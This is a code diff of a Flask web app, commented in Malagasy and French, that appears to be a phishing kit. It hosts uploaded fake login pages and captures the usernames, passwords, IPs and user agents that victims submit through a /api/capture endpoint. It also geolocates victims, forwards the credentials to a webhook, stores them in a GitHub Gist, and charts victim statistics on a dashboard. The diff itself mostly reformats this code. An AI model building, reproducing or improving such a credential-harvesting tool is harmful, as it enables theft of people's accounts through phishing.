@@ -28,7 +28,7 @@ ADMIN_PASS = "admin123"
 ACCESS_CODE = "TONY2026"
 
 # GitHub Gist Persistance
-GIST_ID = "a08b5882fbe8fa95c1e8cb9230e53626"  # ⚠️ SOLOY AMIN'NY GIST ID-NAO
+GIST_ID = "TON_GIST_ID"  # ⚠️ SOLOY AMIN'NY GIST ID-NAO
 GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', '')
 
 # Cache local
@@ -39,7 +39,6 @@ data_store = {'templates': [], 'credentials': [], 'settings': {}}
 # =====================================================
 
 def load_from_gist():
-    """Maka données avy amin'ny Gist"""
     if not GITHUB_TOKEN or GIST_ID == "TON_GIST_ID":
         return None
     try:
@@ -58,9 +57,7 @@ def load_from_gist():
         return None
 
 def save_to_gist(data):
-    """Mampakatra données any amin'ny Gist"""
     if not GITHUB_TOKEN or GIST_ID == "TON_GIST_ID":
-        print("[GIST] Token na GIST ID tsy voaconfiguré")
         return False
     try:
         url = f"https://api.github.com/gists/{GIST_ID}"
@@ -73,7 +70,6 @@ def save_to_gist(data):
         return False
 
 def sync_data():
-    """Mampifanaraka ny données"""
     global data_store
     remote = load_from_gist()
     if remote:
@@ -121,7 +117,7 @@ class GeoLocator:
 geo_locator = GeoLocator()
 
 # =====================================================
-# WEBHOOK MANAGER (SIMPLE)
+# WEBHOOK MANAGER
 # =====================================================
 
 class WebhookManager:
@@ -232,7 +228,7 @@ def statistics():
     return render_template('dashboard/statistics.html')
 
 # =====================================================
-# API PUBLIC URL & SHORTENER
+# API
 # =====================================================
 
 @app.route('/api/public-url')
@@ -245,12 +241,7 @@ def shorten_url():
     try:
         r = requests.get(f'https://tinyurl.com/api-create.php?url={url}', timeout=5)
         return jsonify({'short_url': r.text.strip()})
-    except:
-        return jsonify({'short_url': url})
-
-# =====================================================
-# API TEMPLATES
-# =====================================================
+    except: return jsonify({'short_url': url})
 
 @app.route('/api/templates/list')
 def api_templates_list():
@@ -265,18 +256,15 @@ def upload_template():
     if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
     f = request.files.get('file')
     if not f or not f.filename.endswith('.html'): return jsonify({'error': 'HTML requis'}), 400
-    
     tid = str(uuid.uuid4())[:8]
     html_content = f.read().decode('utf-8')
     name = request.form.get('name', 'Template')
     ttype = request.form.get('type', 'custom')
     color = request.form.get('color', '#e94560')
-    
     template = {'id': tid, 'name': name, 'type': ttype, 'color': color, 'active': True, 'html_content': html_content}
     if 'templates' not in data_store: data_store['templates'] = []
     data_store['templates'].append(template)
     save_to_gist(data_store)
-    
     return jsonify({'success': True, 'template_id': tid, 'url': f"{request.host_url.rstrip('/')}/t/{tid}"})
 
 @app.route('/api/templates/<tid>/update', methods=['POST'])
@@ -317,10 +305,6 @@ def serve_template(tid):
             return t['html_content']
     return "Template introuvable", 404
 
-# =====================================================
-# API BUILDER
-# =====================================================
-
 @app.route('/api/builder/save', methods=['POST'])
 def save_builder_template():
     if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
@@ -332,10 +316,6 @@ def save_builder_template():
     save_to_gist(data_store)
     return jsonify({'success': True, 'template_id': tid, 'url': f"{request.host_url.rstrip('/')}/t/{tid}"})
 
-# =====================================================
-# API CAPTURE & LOGS
-# =====================================================
-
 @app.route('/api/capture', methods=['POST'])
 def capture():
     d = request.get_json() if request.is_json else request.form.to_dict()
@@ -346,19 +326,10 @@ def capture():
     if ref:
         try: target = base64.b64decode(ref).decode('utf-8')
         except: target = ref
-    
-    cred = {
-        'id': str(uuid.uuid4())[:8],
-        'template_id': d.get('template_id', 'unknown'),
-        'username': d.get('email') or d.get('username') or '',
-        'password': d.get('pass') or d.get('password') or '',
-        'ip': ip, 'user_agent': ua, 'target': target,
-        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    }
+    cred = {'id': str(uuid.uuid4())[:8], 'template_id': d.get('template_id', 'unknown'), 'username': d.get('email') or d.get('username') or '', 'password': d.get('pass') or d.get('password') or '', 'ip': ip, 'user_agent': ua, 'target': target, 'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
     if 'credentials' not in data_store: data_store['credentials'] = []
     data_store['credentials'].append(cred)
     save_to_gist(data_store)
-    
     try:
         loc = geo_locator.locate(ip)
         location = geo_locator.format_location(loc)
@@ -367,7 +338,6 @@ def capture():
                 webhook_manager.notify(t.get('name', cred['template_id']), cred['username'], cred['password'], ip, location)
                 break
     except: pass
-    
     return jsonify({'success': True})
 
 @app.route('/api/logs/list')
@@ -400,10 +370,6 @@ def export_logs_pdf():
     for c in logs[:100]: txt += f"{c['username']} | {c['ip']} | {c['timestamp']}\n"
     return Response(txt, mimetype="text/plain", headers={"Content-disposition": "attachment; filename=rapport.txt"})
 
-# =====================================================
-# API STATISTIQUES AVANCÉES
-# =====================================================
-
 @app.route('/api/statistics/advanced')
 def api_statistics_advanced():
     if 'user' not in session: return jsonify({'error': 'Non authentifié'}), 401
@@ -412,7 +378,6 @@ def api_statistics_advanced():
     browsers = {}
     os_data = {}
     hourly = {str(h).zfill(2): 0 for h in range(24)}
-    
     for c in creds:
         ip = c['ip']
         if ip and ip != '127.0.0.1':
@@ -437,19 +402,8 @@ def api_statistics_advanced():
         if ts:
             try: hourly[ts.split(' ')[1].split(':')[0]] += 1
             except: pass
-    
     sorted_countries = sorted(countries.items(), key=lambda x: x[1], reverse=True)[:10]
-    return jsonify({
-        'countries': [{'name': c[0], 'count': c[1]} for c in sorted_countries],
-        'browsers': [{'name': b, 'count': c} for b, c in browsers.items()],
-        'os': [{'name': o, 'count': c} for o, c in os_data.items()],
-        'hourly': {'labels': [f"{h}h" for h in range(24)], 'data': [hourly[str(h).zfill(2)] for h in range(24)]},
-        'total': len(creds)
-    })
-
-# =====================================================
-# API STATS & PROFILE & WEBHOOKS & SETTINGS
-# =====================================================
+    return jsonify({'countries': [{'name': c[0], 'count': c[1]} for c in sorted_countries], 'browsers': [{'name': b, 'count': c} for b, c in browsers.items()], 'os': [{'name': o, 'count': c} for o, c in os_data.items()], 'hourly': {'labels': [f"{h}h" for h in range(24)], 'data': [hourly[str(h).zfill(2)] for h in range(24)]}, 'total': len(creds)})
 
 @app.route('/api/stats')
 def api_stats():
